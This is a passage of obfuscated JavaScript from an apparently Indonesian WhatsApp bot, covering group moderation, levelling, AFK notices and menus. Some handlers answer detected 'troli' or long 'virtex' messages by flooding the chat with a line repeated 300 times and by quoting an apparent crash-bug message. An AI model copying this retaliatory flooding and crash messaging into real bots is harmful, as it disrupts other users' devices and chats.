  const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
  const isQuotedLoca = type === 'extendedTextMessage' && content.includes('locationMessage')
  const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
  const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
  const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
  const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
  const isQuotedDocs = type === 'extendedTextMessage' && content.includes('documentMessage')
  const isQuotedTeks = type === 'extendedTextMessage' && content.includes('quotedMessage')
  const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
  const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')

YANZ.chatRead(from, "read")
expiredCheck(premium)
expiredCheckS(YANZ, sewa)

 

if (isGroup && isAntro && m.message && m.isBaileys && m.quoted && m.quoted.mtype === 'orderMessage' && !(m.quoted.token && m.quoted.orderId)) {
reply(`Troli Detected\n` + require('util').format(m.key))
YANZ.sendMessage(from, '*TANDAI TELAH DI BACA!!*\n'.repeat(300), text)
await YANZ.modifyChat(m.chat, 'delete', {
includeStarred: false
})
}
if (setiker.includes(messagesC)){
namastc = messagesC
buffer = fs.readFileSync(`./database/stick/${namastc}.webp`)
fs.writeFileSync('./sticker/responder.webp', buffer)
exec(`webpmux -set exif ./sticker/data.exif ./sticker/responder.webp -o ./sticker/responder.webp`, async (error) => {
if (error) return reply(mess.error)
YANZ.sendMessage(from, fs.readFileSync(`./sticker/responder.webp`), sticker, {quoted: mek})
fs.unlinkSync(`./sticker/responder.webp`)
})
}

if (audionye.includes(messagesC)){
namastc = messagesC
buffer = fs.readFileSync(`./database/audio/${namastc}.mp3`)
YANZ.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: mek, ptt: true })
}
  if (isGroup && isAntiLink && !isOwner && !isGroupAdmins && isBotGroupAdmins){
  if (budy.match(/(https:\/\/chat.whatsapp.com)/gi)) {
  replybutton1(from, `${prefix}antilink off`,
  `Klik Di Bawah Untuk Mematikan`,
  `DISABLE ANTILINK`,
  `*❗ ANTI LINK GROUP DETECTOR ❗*
 
*Maaf Kamu Akan Di Kick Dari Group Ini!*`)
   YANZ.groupRemove(from, [sender])
    }
    }
    if (budy.length > 10000) {
    if (!itsMe) return
    if (m.isBaileys) return
    sendMess(`${ownerNumber}`, `Hai Owner! *wa.me/${sender.split("@")[0]}* Terdeteksi Telah Mengirim Virtex ${isGroup?`*In Group ${groupName}*`:''}`, text)
    YANZ.modifyChat(m.chat, 'delete', {
    includeStarred: false
    })
    YANZ.sendMessage(from, `「 *VIRTEX DETECTED* 」 `, text, {quoted:bugtroli})
    YANZ.sendMessage(from, '*TANDAI TELAH DI BACA!!*\n'.repeat(300), text)
    }
   if (!m.isBaileys && isGroup && isBadword && !isOwner && !isGroupAdmins && !mek.key.fromMe){
   for (let kasar of badword){
   if (chats.toLowerCase().includes(kasar)){
   if (isCountKasar(sender, senbadword)){
   if (!isBotGroupAdmins) return reply(`Kamu beruntung karena bot bukan admin`)
   replybutton1(from, `${prefix}antibadword off`, `𝙺𝙻𝙸𝙺 𝙳𝙸 𝙱𝙰𝚆𝙰𝙷 𝚄𝙽𝚃𝚄𝙺 𝙼𝙴𝙼𝙰𝚃𝙸𝙺𝙰𝙽`,`DISABLE ANTI BADWORD`,`━••❗ *ANTI BADWORD* ❗••━

Hai @${sender.split("@")[0]}
Sepertinya kamu sudah berkata kasar lebih dari 2x, maaf kamu akan di kick`)
YANZ.groupRemove(from, [sender])
delCountKasar(sender, senbadword)
} else {
addCountKasar(sender, senbadword)
reply(`Kamu terdeteksi berkata kasar\nJangan ulangi lagi atau kamu akan dikick`)
}
}
}
}
if (autoupdatebio){
var _0x29b3e7=_0x2c08;function _0x2c08(_0x1af4f2,_0x56f24c){var _0x16cbd2=_0x16cb();return _0x2c08=function(_0x2c0863,_0x2e10eb){_0x2c0863=_0x2c0863-0x116;var _0x22c20e=_0x16cbd2[_0x2c0863];return _0x22c20e;},_0x2c08(_0x1af4f2,_0x56f24c);}(function(_0x4d4fc8,_0x22d672){var _0x34b95e=_0x2c08,_0x22c258=_0x4d4fc8();while(!![]){try{var _0x5baa83=parseInt(_0x34b95e(0x11c))/0x1+parseInt(_0x34b95e(0x11f))/0x2+-parseInt(_0x34b95e(0x121))/0x3*(-parseInt(_0x34b95e(0x11e))/0x4)+-parseInt(_0x34b95e(0x116))/0x5*(parseInt(_0x34b95e(0x123))/0x6)+parseInt(_0x34b95e(0x117))/0x7*(-parseInt(_0x34b95e(0x120))/0x8)+parseInt(_0x34b95e(0x11a))/0x9+-parseInt(_0x34b95e(0x119))/0xa*(-parseInt(_0x34b95e(0x118))/0xb);if(_0x5baa83===_0x22d672)break;else _0x22c258['push'](_0x22c258['shift']());}catch(_0x1049be){_0x22c258['push'](_0x22c258['shift']());}}}(_0x16cb,0xbbf5c),YANZ[_0x29b3e7(0x11d)](_0x29b3e7(0x11b)+kyun(process['uptime']())+'\x20Total\x20hit\x20:\x20'+totalhit)[_0x29b3e7(0x122)](_0x2d72ed=>_0x2d72ed),settingstatus=new Date()*0x1);function _0x16cb(){var _0x54615e=['6MxrdWd','6684985xEhYwz','7jKfdYc','143xonSrd','153510XfduPH','5396094GwfZSF','Runtime\x20:\x20','1473514PFPSar','setStatus','164tuFfgl','117138JDEHfA','2452616zhSfjO','6018tGnCfU','catch'];_0x16cb=function(){return _0x54615e;};return _0x16cb();}
}

if (isGroup && m.isBaileys) {
if (mentionUser.length >= groupMembers.length){
if (!budy.match(/(@)/gi)) {
mentions(`Terdeteksi @${sender.split('@')[0]} melakukan hidetag`, [sender], false)
}
}
}

const levelRole = getLevelingLevel(sender)
 var role = 'Bronze 1'
  if (levelRole <= 2) {
role = 'Bronze 1'
  } else if (levelRole <= 10) {
role = 'Bronze 2'
  } else if (levelRole <= 20) {
role = 'Bronze 3'
  } else if (levelRole <= 30) {
role = 'Bronze 4'
  } else if (levelRole <= 40) {
role = 'Bronze 5'
  } else if (levelRole <= 70) {
role = 'Silver 1'
  } else if (levelRole <= 85) {
role = 'Silver 2'
  } else if (levelRole <= 95) {
role = 'Silver 3'
  } else if (levelRole <= 105) {
role = 'Silver 4'
  } else if (levelRole <= 125) {
role = 'Silver 5'
  } else if (levelRole <= 150) {
role = 'Gold 1'
  } else if (levelRole <= 170) {
role = 'Gold 2'
  } else if (levelRole <= 190) {
role = 'Gold 3'
  } else if (levelRole <= 210) {
role = 'Gold 4'
  } else if (levelRole <= 230) {
role = 'Gold 5'
  } else if (levelRole <= 260) {
role = 'Platinum 1'
  } else if (levelRole <= 290) {
role = 'Platinum 2'
  } else if (levelRole <= 320) {
role = 'Platinum 3'
  } else if (levelRole <= 350) {
role = 'Platinum 4'
  } else if (levelRole <= 380) {
role = 'Platinum 5'
  } else if (levelRole <= 410) {
role = 'Diamond 1'
  } else if (levelRole <= 450) {
role = 'Diamond 2'
  } else if (levelRole <= 500) {
role = 'Diamond 3'
  } else if (levelRole <= 550) {
role = 'Diamond 4'
  } else if (levelRole <= 600) {
role = 'Diamond 5'
  } else if (levelRole <= 700) {
role = 'Master'
  } else if (levelRole <= 800) {
role = 'Master ✩'
  } else if (levelRole <= 900) {
role = 'Master ✩✩'
  } else if (levelRole <= 1000) {
role = 'Master ✩✩✩'
  } else if (levelRole <= 1100) {
role = 'Master ✯'
  } else if (levelRole <= 1225) {
role = 'Master ✯✯'
  } else if (levelRole <= 1340) {
role = 'Master ✯✯✯'
  } else if (levelRole <= 1400) {
role = 'GrandMaster'
  } else if (levelRole <= 1555) {
role = 'GrandMaster ✩'
  } else if (levelRole <= 1660) {
role = 'GrandMaster ✩✩'
  } else if (levelRole <= 1710) {
role = 'GrandMaster ✩✩✩'
  } else if (levelRole <= 1825) {
role = 'GrandMaster ✯'
  } else if (levelRole <= 1950) {
role = 'GrandMaster ✯✯'
  } else if (levelRole <= 2000) {
role = 'GrandMaster ✯✯✯'
  } else if (levelRole <= 2220) {
role = 'Legends'
  } else if (levelRole <= 2500) {
role = 'Legends 2'
  } else if (levelRole <= 2700) {
role = 'Legends 3'
  } else if (levelRole <= 2900) {
role = 'Legends 4'
  } else if (levelRole <= 3100) {
role = 'Legends 5'
  } else if (levelRole <= 3300) {
role = 'Legends 6'
  } else if (levelRole <= 3600) {
role = 'Legends 7'
  } else if (levelRole <= 3900) {
role = 'Legends 8'
  } else if (levelRole <= 4200) {
role = 'Legends 9'
  } else if (levelRole <= 4450) {
role = 'Legends 10'
  } else if (levelRole <= 4700) {
role = 'Legends 忍'
  } else if (levelRole <= 4900) {
role = 'Legends 忍¹'
  } else if (levelRole <= 5100) {
role = 'Legends 忍²'
  } else if (levelRole <= 5600) {
role = 'Legends 忍³'
  } else if (levelRole <= 6100) {
role = 'Legends 忍⁴'
  } else if (levelRole <= 7000) {
role = 'GrandLegends'
  } else if (levelRole <= 10000) {
role = 'GrandLegends 1'
  } else if (levelRole <= 20000) {
role = 'GrandLegends 2'
  } else if (levelRole <= 30000) {
role = 'GrandLegends 3'
  } else if (levelRole <= 40000) {
role = 'GrandLegends 4'
  } else if (levelRole <= 50000) {
role = 'GrandLegends 忍¹'
  } else if (levelRole <= 60000) {
role = 'GrandLegends 忍²'
  } else if (levelRole <= 70000) {
role = 'GrandLegends 忍³'
  } else if (levelRole <= 80000) {
role = 'GrandLegends 忍⁴'
  } else if (levelRole <= 90000) {
role = 'Pro 숒'
  } else if (levelRole <= 99999999999999) {
role = 'Pro × GrandLegends 숒'
}
const addVn = function(kata){
audionye.push(kata)
fs.writeFileSync('./database/audio.json', JSON.stringify(audionye))
}
const dellVn = function(kata){
anu = audionye.indexOf(kata)
audionye.splice(anu, 1)
fs.writeFileSync('./database/audio.json', JSON.stringify(audionye))
}
for (var i = 0; i < cmdDB.length ; i++) {
if (budy.toLowerCase() === cmdDB[i].commands) {
YANZ.sendMessage(from, `${cmdDB[i].jawaban}`, text, {quoted:mek, thumbnail:gambar2})
}
}
const addStc = function(kata){
setiker.push(kata)
fs.writeFileSync('./database/stick.json', JSON.stringify(setiker))
}
const dellStc = function(kata){
anu = setiker.indexOf(kata)
setiker.splice(anu, 1)
fs.writeFileSync('./database/stick.json', JSON.stringify(setiker))
}
if (isGroup && !m.isBaileys) {
if (mentionUser.length !== 0){
for (let ment of mentionUser) {
if (afk.checkAfkUser(ment, _afk)) {
const getId = afk.getAfkId(ment, _afk)
const getReason = afk.getAfkReason(getId, _afk)
const getTime = Date.now() - afk.getAfkTime(getId, _afk)
const heheh = ms(getTime)
replybutton1(from, `ok`, `Ssssst Diemmm`, `SIAP👌`, `@${ment.split('@')[0]} sedang afk\n\n*Alasan :* ${getReason}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu`)
}
}
}
if (afk.checkAfkUser(sender, _afk)) {
const getId = afk.getAfkId(sender, _afk)
const reason = afk.getAfkReason(sender, _afk)
const getTime = Date.now() - afk.getAfkTime(getId, _afk)
const heheh = ms(getTime)
_afk.splice(afk.getAfkPosition(sender, _afk), 1)
reply(`
@${sender.split("@")[0]} telah kembali afk setelah *${reason}*
Sejak : ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik yang lalu

selamat datang kembali ✨`)
fs.writeFileSync('./database/afk.json', JSON.stringify(_afk))
}
}
if (isGroup && isUser && !isCmd) {
const currentLevel = getLevelingLevel(sender)
const checkId = getLevelingId(sender)
try {
if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
const amountXp = Math.floor(Math.random() * 10) + 50
const requiredXp = 3000 * (Math.pow(2, currentLevel) - 1)
const getLevel = getLevelingLevel(sender)
addLevelingXp(sender, amountXp)
if (requiredXp <= getLevelingXp(sender)) {
addLevelingLevel(sender, 1)
addBalance(sender, 30, balance)
reply(`*─ 「 LEVEL UP 」 ─*

⬡ *User :* @${sender.split("@")[0]}
⬡ *Nomer :* ${sender.split("@")[0]}
⬡ *Xp :* ${getLevelingXp(sender)}
⬡ *Level :* ${getLevel} > ${getLevelingLevel(sender)}
⬡ *Balance :* $${getBalance(sender, balance)}*
⬡ *Role :* ${role}

Congrats 🎉`)
}
} catch (err) {
console.error(err)
}
}
if (isCmd && msgFilter.isFiltered(from) && !isGroup) {
console.log(color('[ SPAM ]','red'), (command), ">", (sender.split('@')[0]))
return reply('Sabar, Jangan spamm...')
} 
if (isCmd && msgFilter.isFiltered(from) && isGroup) {
console.log(color('[ SPAM ]','red'), (command), ">", (sender.split('@')[0]), "=>", color(groupName, "yellow"))
return reply('Sabar, Jangan spamm...')
}  
if (autovn){
await YANZ.updatePresence(from, Presence.recording)
} else if (ngetik){
await YANZ.updatePresence(from, Presence.composing)
} else {
await YANZ.updatePresence(from, Presence.avaible)
}
if (isCmd && !isGroup) console.log(color('[CMD]','red'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YYYY || HH:mm:ss'), 'white'), color(`${command} [${args.length}]`,'red'), 'from', color(`${sender.split("@")[0]}`,'red'))
if (isCmd && isGroup){
console.log(color('[CMD]','red'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YYYY || HH:mm:ss'), 'white'), color(`${command} [${args.length}]`,'red'), 'from', color(`${sender.split("@")[0]}`,'red'), 'in', color(groupName,'red'))
addBalance(sender, randomNomor(20), balance)
}

if (isCmd && !isOwner) msgFilter.addFilter(from)

var isBtn = Object.keys(mek.message)[0] === "buttonsResponseMessage" ? mek.message.buttonsResponseMessage.selectedButtonId : ""
switch(isBtn){
case 'yatictactoe':
//GA SENGAJA BENERAN
function _0x4279(){const _0x5e98d7=['932jBGshX','_matrix','writeFileSync','757048sqzurM','status','./database/game/tictactoe/db/','2982NCFJJz','.json','7455427nOdsLS','existsSync','Game\x20telah\x20dimulai\x20sebelumnya!','\x0a\x0a\x20','\x20\x20\x20\x20🎮\x20*TICTACTOE*\x20🎮\x0a\x0a*GAME\x20DI\x20MULAI!*\x0a\x0aPlayer\x20❎\x20:\x20@','332sQJUFY','24DHYVUb','*\x0a\x0a*NOTE\x20:\x20KETIK\x20NYERAH\x20JIKA\x20INGIN\x20MENYERAH!*','3978NAFNiw','Opsi\x20ini\x20hanya\x20untuk\x20@','63536jTWGFN','330wVkqVU','790929rsXrbp','text','18140FwUncB','6BtoJGN','\x0a\x0aPlayer\x20⭕\x20:\x20@','@s.whatsapp.net','8388geqglQ','\x0a\x0a\x20\x20\x20\x20\x20\x0a\x0a*Giliran\x20@'];_0x4279=function(){return _0x5e98d7;};return _0x4279();}function _0x2674(_0x251a8e,_0x13a581){const _0x427918=_0x4279();return _0x2674=function(_0x26740b,_0x2032d1){_0x26740b=_0x26740b-0x120;let _0xfb35bd=_0x427918[_0x26740b];return _0xfb35bd;},_0x2674(_0x251a8e,_0x13a581);}const _0x2e7f28=_0x2674;(function(_0x341896,_0x38badf){const _0x301599=_0x2674,_0x5ca0ad=_0x341896();while(!![]){try{const _0x42110d=parseInt(_0x301599(0x131))/0x1+-parseInt(_0x301599(0x12e))/0x2*(-parseInt(_0x301599(0x134))/0x3)+-parseInt(_0x301599(0x13b))/0x4*(-parseInt(_0x301599(0x128))/0x5)+-parseInt(_0x301599(0x129))/0x6*(parseInt(_0x301599(0x136))/0x7)+-parseInt(_0x301599(0x120))/0x8*(parseInt(_0x301599(0x126))/0x9)+parseInt(_0x301599(0x125))/0xa*(parseInt(_0x301599(0x124))/0xb)+-parseInt(_0x301599(0x12c))/0xc*(-parseInt(_0x301599(0x122))/0xd);if(_0x42110d===_0x38badf)break;else _0x5ca0ad['push'](_0x5ca0ad['shift']());}catch(_0x35927d){_0x5ca0ad['push'](_0x5ca0ad['shift']());}}}(_0x4279,0x91cb6));if(fs[_0x2e7f28(0x137)](_0x2e7f28(0x133)+from+'.json'))var boardnow=setGame(''+from);if(boardnow['O']==sender['replace']('@s.whatsapp.net','')){if(boardnow[_0x2e7f28(0x132)])return reply(_0x2e7f28(0x138));const matrix=boardnow[_0x2e7f28(0x12f)];boardnow['status']=!![],fs[_0x2e7f28(0x130)](_0x2e7f28(0x133)+from+_0x2e7f28(0x135),JSON['stringify'](boardnow,null,0x2));const chatAccept=_0x2e7f28(0x13a)+boardnow['X']+_0x2e7f28(0x12a)+boardnow['O']+'\x0a\x0a\x20\x0a\x0a\x20'+matrix[0x0][0x0]+'\x20'+matrix[0x0][0x1]+'\x20'+matrix[0x0][0x2]+_0x2e7f28(0x139)+matrix[0x1][0x0]+'\x20'+matrix[0x1][0x1]+'\x20'+matrix[0x1][0x2]+_0x2e7f28(0x139)+matrix[0x2][0x0]+'\x20'+matrix[0x2][0x1]+'\x20'+matrix[0x2][0x2]+_0x2e7f28(0x12d)+(boardnow['turn']=='X'?boardnow['X']:boardnow['O'])+_0x2e7f28(0x121);hu=YANZ['sendMessage'](from,chatAccept,MessageType[_0x2e7f28(0x127)],{'quoted':mek,'contextInfo':{'mentionedJid':[boardnow['X']+_0x2e7f28(0x12b),boardnow['O']+'@s.whatsapp.net']}});}else YANZ['sendMessage'](from,_0x2e7f28(0x123)+boardnow['O']+'\x20!',MessageType[_0x2e7f28(0x127)],{'quoted':mek,'contextInfo':{'mentionedJid':[boardnow['O']+_0x2e7f28(0x12b)]}});
break
case 'notictactoe':
//MAU NO ENC? CHAT GW DI WA (NEED DUIT XIXII)
function _0x4a38(_0x4ba0de,_0x1bcfb9){var _0x55c609=_0x55c6();return _0x4a38=function(_0x4a381b,_0x15b5a5){_0x4a381b=_0x4a381b-0x101;var _0x4c7339=_0x55c609[_0x4a381b];return _0x4c7339;},_0x4a38(_0x4ba0de,_0x1bcfb9);}var _0x5f2c3d=_0x4a38;(function(_0x3c86f6,_0x5cee46){var _0x317b02=_0x4a38,_0x2face6=_0x3c86f6();while(!![]){try{var _0x1d6883=-parseInt(_0x317b02(0x108))/0x1+-parseInt(_0x317b02(0x115))/0x2*(-parseInt(_0x317b02(0x101))/0x3)+-parseInt(_0x317b02(0x10b))/0x4*(parseInt(_0x317b02(0x109))/0x5)+parseInt(_0x317b02(0x113))/0x6*(parseInt(_0x317b02(0x10f))/0x7)+parseInt(_0x317b02(0x110))/0x8+parseInt(_0x317b02(0x10a))/0x9+parseInt(_0x317b02(0x10d))/0xa;if(_0x1d6883===_0x5cee46)break;else _0x2face6['push'](_0x2face6['shift']());}catch(_0x2c3810){_0x2face6['push'](_0x2face6['shift']());}}}(_0x55c6,0xcae70));function _0x55c6(){var _0x3c11a2=['./database/game/tictactoe/db/','EzzEzz,\x20Bro\x20@','text','1359617mcUQoc','919570YJVdFV','1187289VxQaOE','16oahQMM','Game\x20telah\x20dimulai\x20sebelumnya!','20259000XiBJxs','@s.whatsapp.net','891037IDilHo','187808rvOXlz','status','Opsi\x20ini\x20hanya\x20untuk\x20@','6XPlqsS','unlinkSync','26YKwEXd','142563maUMls','sendMessage','\x20Lawanmu\x20Ketakutan\x20:v','.json'];_0x55c6=function(){return _0x3c11a2;};return _0x55c6();}if(fs['existsSync'](_0x5f2c3d(0x105)+from+_0x5f2c3d(0x104)))var boardnow=setGame(''+from);if(boardnow['O']==sender['replace']('@s.whatsapp.net','')){if(boardnow[_0x5f2c3d(0x111)])return reply(_0x5f2c3d(0x10c));fs[_0x5f2c3d(0x114)](_0x5f2c3d(0x105)+from+_0x5f2c3d(0x104)),YANZ[_0x5f2c3d(0x102)](from,_0x5f2c3d(0x106)+boardnow['X']+_0x5f2c3d(0x103),MessageType[_0x5f2c3d(0x107)],{'quoted':mek,'contextInfo':{'mentionedJid':[boardnow['X']+_0x5f2c3d(0x10e)]}});}else YANZ[_0x5f2c3d(0x102)](from,_0x5f2c3d(0x112)+boardnow['O']+'\x20!',MessageType['text'],{'quoted':mek,'contextInfo':{'mentionedJid':[boardnow['O']+'@s.whatsapp.net']}});
break
case 'snik':
if (isBan) return
reply(`⚠️ *SYARAT DAN KETENTUAN* ⚠️

*1. Pengguna dapat menggunakan semua perintah/command dengan batasan limit, terkecuali user premium dengan limit tanpa batas/unlimited, dan tidak melakukan spam terhadap bot.*
*2. Dilarang keras mengirim pesan V dan semacamnya yang membuat server down ataupun bot crash*
*3. Pengguna yang mengirim hal atau data pribadi tidak akan disimpan oleh bot ini, dan tidak akan bertanggung jawab atas data pribadi tersebut!*
*4. Kami tidak pernah meminta anda untuk memberikan informasi pribadi.*

┌─ ❗ *RULES* ❗ ─
│1. Jangan spam bot. 
│Sanksi: *WARN/SOFT BLOCK*
│
│2. Jangan telepon bot.
│Sanksi: *SOFT BLOCK*
│
│3. Jangan mengeksploitasi bot.
│Sanksi: *PERMANENT BLOCK*
└──────────

_Note : Bot ini menggunakan autoread atau langsung membaca pesan yang pengguna kirim_

𝚁𝙴𝙶𝙰𝚁𝙳𝚂 : By:Owner🛒 || ${nomerowner}!`)
break
}
switch (command) {
case 'allfitur': case 'fitur': case 'allmenu':
  if (isBan) return reply(mess.ban)
  if (!isUser) return reply(mess.noregis)
  anjay = nomerowner+'@s.whatsapp.net'
let cekvipp = ms(_prem.getPremiumExpired(sender,premium) - Date.now())
   try {
  ppimk = await YANZ.getProfilePicture(`${sender.split('@')[0]}@c.us`)
  } catch {
  ppimk = `${imagebb}`
  }
  ppimg = await getBuffer(ppimk)
menunya = `━ YOUR INFO ━

⬣ Nama : ${pushname} 
⬣ Nomor : ${sender.split("@")[0]} 
⬣ Status : ${isOwner?`Owner ⚔️`:isPrem?`Premium 🏅`:`Free User`} 
⬣ Expired Prem : ${isOwner?`Unlimited Owner`:isPrem ? `${cekvipp.days}d, ${cekvipp.hours}h, ${cekvipp.minutes}m, ${cekvipp.seconds}s`:'Not Premium'}
⬣ Limit : ${isOwner?`Unlimited Owner`:isPrem ? `Unlimited Premium` : getLimit(sender, limitawal, limit) +' / '+limitawal}
⬣ Limit Game : ${cekGLimit(sender, gcount, glimit)} / ${gcount}
⬣ Balance : $${getBalance(sender, balance)}

${menu.download(f, prefix)}

${menu.convert(f, prefix)}

${menu.grup(f, prefix)}

${menu.search(f, prefix)}

${menu.anime(f, prefix)}

${menu.fun(f, prefix)}

${menu.editing(f, prefix)}

${menu.maker(f, prefix)}

${menu.storage(f, prefix)}

${menu.session(f, prefix)}

${menu.aboutlimit(f, prefix)}

${menu.others(f, prefix)}

${menu.gabut(f, prefix)}

${menu.owner(f, prefix)}`
var _0x5c2da4=_0x3c97;function _0x4647(){var _0x456093=['split','23992630cyPvtD','7.8000','5328biqOBQ','prepareMessage','4YgxEjD','IDR','73olAQyq','4626355vjIAYN','2878teVDwE','5617308DcWBZs','10000000','4478868djUhyy','1011','8532643gAddlM','prepareMessageFromContent','message','18016yECnum','@s.whatsapp.net'];_0x4647=function(){return _0x456093;};return _0x4647();}function _0x3c97(_0x20dd1c,_0x1ec1c8){var _0x464764=_0x4647();return _0x3c97=function(_0x3c9720,_0x3b16a7){_0x3c9720=_0x3c9720-0x155;var _0x55d5a1=_0x464764[_0x3c9720];return _0x55d5a1;},_0x3c97(_0x20dd1c,_0x1ec1c8);}(function(_0x6e846b,_0x470bfe){var _0x3be09c=_0x3c97,_0x252d9d=_0x6e846b();while(!![]){try{var _0x1a8fdf=parseInt(_0x3be09c(0x15d))/0x1*(-parseInt(_0x3be09c(0x15f))/0x2)+parseInt(_0x3be09c(0x162))/0x3*(-parseInt(_0x3be09c(0x15b))/0x4)+-parseInt(_0x3be09c(0x15e))/0x5+parseInt(_0x3be09c(0x160))/0x6+-parseInt(_0x3be09c(0x164))/0x7+-parseInt(_0x3be09c(0x167))/0x8*(-parseInt(_0x3be09c(0x159))/0x9)+parseInt(_0x3be09c(0x157))/0xa;if(_0x1a8fdf===_0x470bfe)break;else _0x252d9d['push'](_0x252d9d['shift']());}catch(_0x52461c){_0x252d9d['push'](_0x252d9d['shift']());}}}(_0x4647,0xe22ea),imeg=await YANZ[_0x5c2da4(0x15a)](from,gambar,'imageMessage'),imeu=imeg[_0x5c2da4(0x166)]['imageMessage'],YANZ['relayWAMessage'](await YANZ[_0x5c2da4(0x165)](from,{'productMessage':{'businessOwnerJid':nomerowner+_0x5c2da4(0x155),'product':{'productId':_0x5c2da4(0x163),'productImage':imeu,'title':'Selamat\x20'+waktoo+'\x20'+(pushname==undefined?sender[_0x5c2da4(0x156)]('@')[0x0]:pushname),'description':''+menunya,'currencyCode':_0x5c2da4(0x15c),'priceAmount1000':_0x5c2da4(0x161),'retailerId':'','url':'','productImageCount':0x1,'salePriceAmount1000':_0x5c2da4(0x158)}}},{'quoted':mek})));
break
case 'start': case 'starts': case 'menu': case 'help':{
  if (isBan) return reply(mess.ban)
  if (!isUser) return reply(mess.noregis)
let cekvipp = ms(_prem.getPremiumExpired(sender,premium) - Date.now())
let p = 0
menu1 = `Selamat ${waktoo} ${pushname==undefined?sender.split("@")[0]:pushname} ✨

─ 𝗬𝗢𝗨𝗥 𝗜𝗡𝗙𝗢︎ ─ 

⬣ Nama : ${pushname} 
⬣ Tag : @${sender.split("@")[0]} 
⬣ Status : ${isOwner?`Owner ⚔️`:isPrem?`Premium 🏅`:`Free User`} 
⬣ Expired Prem : ${isOwner?`Unlimited Owner`:isPrem ? `${cekvipp.days}d, ${cekvipp.hours}h, ${cekvipp.minutes}m, ${cekvipp.seconds}s`:'Not Premium'}
⬣ Limit : ${isOwner?`Unlimited Owner`:isPrem ? `Unlimited Premium` : getLimit(sender, limitawal, limit) +' / '+limitawal}
⬣ Limit Game : ${cekGLimit(sender, gcount, glimit)} / ${gcount}
⬣ Balance : $${getBalance(sender, balance)}`

futer = `
── Ⓜ︎Ⓐ︎Ⓘ︎Ⓝ︎ ──

${f}${prefix}𝚂𝙽𝙺
${f}${prefix}𝙳𝙰𝙵𝚃𝙰𝚁
${f}${prefix}𝙿𝚁𝙾𝙵𝙸𝙻𝙴
${f}${prefix}𝙰𝙵𝙺 _𝚁𝙴𝙰𝚂𝙾𝙽_
${f}${prefix}𝙹𝙰𝙳𝙸𝙰𝙽
${f}${prefix}𝙰𝙻𝙻𝙵𝙸𝚃𝚄𝚁
${f}${prefix}𝙻𝙸𝚂𝚃𝙵𝙸𝚃𝚄𝚁
${f}${prefix}𝙸𝙽𝙵𝙾𝙱𝙾𝚃
${f}${prefix}𝙳𝙾𝙽𝙰𝚂𝙸
${f}${prefix}𝚂𝙲
${f}${prefix}𝙾𝚆𝙽𝙴𝚁
${f}${prefix}𝙲𝚁𝙴𝙰𝚃𝙾𝚁
${f}${prefix}𝙲𝚁𝙴𝙳𝙸𝚃𝚂

Herman Botz`
let gbutsan = [
{ buttonId: `${prefix}listfitur`, buttonText: { displayText: 'List Fitur🎲' }, type: 1 },
{ buttonId: `${prefix}sc`, buttonText: { displayText: 'SC🥵' }, type: 1 }
]
const _0x3b64e2=_0x484b;(function(_0x4984c3,_0x551143){const _0x3bc880=_0x484b,_0x3c3968=_0x4984c3();while(!![]){try{const _0x4da691=parseInt(_0x3bc880(0xea))/0x1*(-parseInt(_0x3bc880(0xe7))/0x2)+parseInt(_0x3bc880(0xe5))/0x3+-parseInt(_0x3bc880(0xdf))/0x4*(parseInt(_0x3bc880(0xe0))/0x5)+-parseInt(_0x3bc880(0xe9))/0x6*(-parseInt(_0x3bc880(0xdd))/0x7)+-parseInt(_0x3bc880(0xe2))/0x8*(-parseInt(_0x3bc880(0xe6))/0x9)+-parseInt(_0x3bc880(0xe8))/0xa*(-parseInt(_0x3bc880(0xe4))/0xb)+-parseInt(_0x3bc880(0xe1))/0xc;if(_0x4da691===_0x551143)break;else _0x3c3968['push'](_0x3c3968['shift']());}catch(_0x4dd48c){_0x3c3968['push'](_0x3c3968['shift']());}}}(_0x34be,0x31ef7));let gbuttonan={'locationMessage':{'degressLongitude':0x0,'degressLatitude':0x1,'address':'a','jpegThumbnail':gambar},'contentText':''+menu1,'footerText':''+futer,'buttons':gbutsan,'headerType':0x6};function _0x484b(_0x3c8619,_0x3e552d){const _0x34be06=_0x34be();return _0x484b=function(_0x484b92,_0x487d38){_0x484b92=_0x484b92-0xdd;let _0x1d459e=_0x34be06[_0x484b92];return _0x1d459e;},_0x484b(_0x3c8619,_0x3e552d);}await YANZ[_0x3b64e2(0xde)](from,gbuttonan,MessageType[_0x3b64e2(0xe3)],{'contextInfo':{'externalAdReply':{},'mentionedJid':[sender],'forwardingScore':0x989680,'isForwarded':!![]}});function _0x34be(){const _0x22473e=['24fDRWMb','162366BaqbBD','362243kZNdxB','sendMessage','308892GgWDyL','10HnWBVW','2782800NWvsLG','1435400KyMgJD','buttonsMessage','3336135ItDuDs','190623OFaKXw','9KqIJbb','2XYyPzU','10eJfPKW'];_0x34be=function(){return _0x22473e;};return _0x34be();}
}
  break   
  case 'listfitur': case 'listmenu':
  if (isBan) return reply(mess.ban)
  if (!isUser) return reply(mess.noregis)
if (mlistmsg){
 list = []
 commandnya = [
`allfitur`,
`infobot`,
`fiturdownload`,
`fiturgrup`,
`fiturfun`,
`fiturconvert`,
`fitursearch`,
`fiturediting`,
`fiturtextmaker`,
`fituranime`,
`fitursession`,
`fiturstorage`,
`fituraboutlimit`,
`fiturother`,
`fiturgabut`,
`fiturowner`
 ]
 viewmenunya = [
`ALL - FITUR`,
`INFO - BOT`,
`FITUR - DOWNLOAD`,
`FITUR - GRUP`,
`FITUR - FUN`,
`FITUR - CONVERT`,
`FITUR - SEARCH`,
`FITUR - EDITING`,
`FITUR - TEXTMAKER`,
`FITUR - ANIME`,
`FITUR - SESSION`,
`FITUR - STORAGE`,
`FITUR - ABOUT LIMIT`,
`FITUR - OTHERS`,
`FITUR - GABUT`,
`FITUR - OWNER`
  ]
 startnum = 0
 for (let x of commandnya) {
 const yy = {title: `──────────────`,
 rows: [
 {
 title: `${viewmenunya[startnum++]}`,
